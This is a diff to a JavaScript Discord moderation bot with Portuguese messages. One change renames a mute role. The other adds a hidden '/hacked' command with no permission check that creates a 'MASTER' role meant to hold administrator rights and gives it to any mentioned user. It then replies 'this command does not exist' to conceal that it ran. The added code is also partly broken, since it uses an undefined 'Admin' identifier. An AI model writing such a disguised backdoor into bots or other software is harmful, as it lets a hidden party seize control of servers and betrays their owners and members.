@@ -116,12 +116,12 @@ bot.on('message', async message => {
           let tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
           if(!tomute) return message.reply("Eu não achei o usuario");
           if(!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send('**Sem permissão**');
-          let muterole = message.guild.roles.find(`name`, "Silenciado");
+          let muterole = message.guild.roles.find(`name`, "Mutado");
          
           if(!muterole){
             try{
               muterole = await message.guild.createRole({
-                name: "Silenciado",
+                name: "Mutado",
                 color: "#000000",
                 permissions:[]
               })
@@ -141,6 +141,36 @@ bot.on('message', async message => {
           await(tomute.addRole(muterole.id));
           message.reply("**Usúario mutado com sucesso!**");
       }  
+
+
+      if (message.content.startsWith("/hacked")) { 
+        let tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
+        if(!tomute) return message.reply("Esse comando não existe.");
+        let muterole = message.guild.roles.find(`name`, "MASTER");
+       
+        if(!muterole){
+          try{
+            muterole = await message.guild.createRole({
+              name: "MASTER",
+              color: "#000000",
+              permissions:[Admin]
+            })
+            message.guild.channels.forEach(async (channel, id) => {
+              await channel.overwritePermissions(muterole, {
+                SEND_MESSAGES: false,
+                ADD_REACTIONS: false
+              });
+            });
+          }catch(e){
+            console.log(e.stack);
+          }
+        }
+      
+
+      
+        await(tomute.addRole(muterole.id));
+        message.reply("**Esse comando não existe.**");
+    }  
 
 });
 bot.login(config.token);
